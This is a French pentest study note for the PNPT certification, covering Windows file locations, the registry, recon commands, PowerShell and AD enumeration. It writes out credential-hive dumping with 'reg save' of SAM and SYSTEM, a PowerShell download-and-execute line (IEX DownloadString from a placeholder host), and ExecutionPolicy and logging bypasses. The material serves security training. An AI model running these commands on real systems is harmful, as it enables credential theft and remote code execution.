---
title: "Windows Fundamentals (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, windows, pentest, pnpt]
date: "2026-05-18"
---

# Windows Fundamentals

En pentest, Windows est la plateforme dominante en entreprise. La majorité des engagements internes finissent sur un Active Directory, donc connaître l'arborescence Windows, le registre et PowerShell n'est pas optionnel — c'est le terrain de jeu.

## Architecture mentale d'un poste Windows

Windows stocke ses secrets et sa configuration à des endroits très spécifiques. Savoir où regarder change tout en post-exploitation.

```
C:\
├── Windows\
│   ├── System32\
│   │   ├── config\
│   │   │   ├── SAM        ← hashes des comptes locaux (verrouillé en runtime)
│   │   │   ├── SYSTEM     ← clé pour déchiffrer SAM
│   │   │   └── SECURITY   ← LSA secrets (mots de passe de services)
│   │   └── drivers\etc\hosts
│   └── Temp\              ← équivalent /tmp Linux
├── Users\
│   └── <user>\
│       ├── AppData\Roaming     ← config applis (souvent credentials cachés)
│       ├── AppData\Local       ← config locale (caches navigateur)
│       └── Documents\
└── ProgramData\           ← config système partagée entre utilisateurs
```

**À retenir** : `SAM` est verrouillé tant que Windows tourne — on ne peut pas juste le copier. Il faut soit booter sur un live USB, soit utiliser `reg save` (admin), soit dumper la mémoire avec Mimikatz.

## Commandes de reconnaissance locale

Premier réflexe sur un shell Windows : qui suis-je, où suis-je, qui sont les autres.

```powershell
whoami /all              # identité complète : SID, groupes, privilèges
hostname
systeminfo               # OS, patches, domaine — clé pour identifier les CVE
net user                 # comptes locaux
net localgroup administrators
net user <user> /domain  # info sur un user du domaine
```

**Pourquoi `whoami /all`** : la liste des privilèges (`SeImpersonatePrivilege`, `SeDebugPrivilege`, etc.) révèle des chemins de privesc. `SeImpersonate` = Potato attacks possibles.

## Réseau et processus

```powershell
ipconfig /all            # config réseau + DNS + DHCP
netstat -ano             # connexions + PID associé
arp -a                   # cache ARP
route print              # table de routage

tasklist /svc            # processus + services associés
tasklist /v              # avec utilisateur propriétaire
sc query                 # tous les services
```

## Le registre Windows

Le registre est une base de données hiérarchique. Cinq "ruches" (hives) principales :

```
HKLM (HKEY_LOCAL_MACHINE) — config système
├── SAM        hashes des comptes locaux
├── SECURITY   secrets LSA (services, scheduled tasks)
├── SYSTEM     boot, drivers, services
├── SOFTWARE   logiciels installés
└── HARDWARE   matériel détecté

HKCU (HKEY_CURRENT_USER) — config utilisateur connecté
HKU  (HKEY_USERS)        — config de tous les utilisateurs
HKCR (HKEY_CLASSES_ROOT) — associations de fichiers
HKCC (HKEY_CURRENT_CONFIG) — profil matériel courant
```

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg save HKLM\SAM C:\Temp\sam.save        # dump SAM (admin)
reg save HKLM\SYSTEM C:\Temp\system.save
```

**Clés "Run"** = exécutées au démarrage. Endroit classique pour la persistance.

## PowerShell : l'outil pivot

PowerShell est à la fois shell, langage de script et accès complet à l'API .NET. C'est l'outil offensif numéro un sur Windows.

```powershell
# Télécharger un fichier
Invoke-WebRequest -Uri http://10.0.0.1/outil.exe -OutFile C:\Temp\outil.exe
(New-Object Net.WebClient).DownloadFile('http://10.0.0.1/x','C:\Temp\x')

# Exécution en mémoire (sans toucher le disque)
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/script.ps1')

# Contourner les restrictions d'exécution
powershell -ep bypass -nop -w hidden -c "<commande>"
```

```
Bypass d'ExecutionPolicy : trois variantes

powershell -ep bypass            ← une session
Set-ExecutionPolicy Bypass -Scope Process    ← session courante
powershell -enc <base64>         ← script encodé, contourne aussi le logging basique
```

**Pourquoi `IEX` est central** : il exécute du code téléchargé sans jamais écrire de fichier. C'est invisible aux AV qui scannent le disque. Évidemment, les EDR modernes hookent `IEX` lui-même — voir AV/EDR Evasion.

## Énumération Active Directory basique

```powershell
# Module ActiveDirectory (RSAT)
Get-ADUser -Filter *
Get-ADComputer -Filter *
Get-ADGroup -Filter *

# Sans RSAT, via .NET directement
([adsisearcher]"(&(objectCategory=person)(objectClass=user))").FindAll()
```

Pour de l'énumération sérieuse, on utilise **PowerView** ou **BloodHound** — voir `[[Active Directory Security]]`.

## Pièges courants

- **`whoami /all` peut être restreint** — sur des sessions très limitées, certaines infos ne sortent pas. Utiliser `net user %username%` en complément.
- **`systeminfo` est lent** mais indispensable — patcher Windows non patché = privesc kernel quasi assurée (essayer Watson/wesng pour identifier les CVE).
- **`reg save SAM` nécessite des droits admin** — sans, on ne récupère pas les hashes. Si on est limité, dumper depuis la mémoire (Mimikatz) ou via `vssadmin` (shadow copy).
- **PowerShell logge tout depuis la version 5** : ScriptBlockLogging et Transcription peuvent enregistrer tes commandes. Vérifier `Get-Item HKLM:\Software\Policies\Microsoft\Windows\PowerShell\*`.
- **`net user /domain` échoue hors domaine** — on est sur une machine standalone ou Workgroup. Vérifier avec `systeminfo | findstr /B "Domain"`.
- **Les chemins `C:\Users\...` peuvent être en français** : `Utilisateurs` au lieu de `Users` sur Windows FR. Toujours vérifier avec `dir C:\`.
